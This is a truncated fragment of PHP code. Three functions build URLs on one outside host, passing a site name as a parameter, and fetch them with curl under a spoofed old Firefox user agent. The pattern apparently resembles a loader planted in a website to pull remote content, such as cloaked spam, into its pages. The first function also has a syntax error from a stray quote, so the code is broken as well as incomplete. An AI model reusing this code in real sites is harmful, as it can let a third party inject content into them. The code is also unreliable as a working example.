...
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/pachiralodge/?go='.$site';
    $ch = curl_init($url);
...
function fetchDataFromSite2($site) {
    $url = 'https://replication2.pkcdurensawit.net/pachiralodge_sites/?sites='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
...
function fetchDataFromSite3($site) {
    $url = 'https://replication2.pkcdurensawit.net/pachiralodge_web/?web='.$site;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
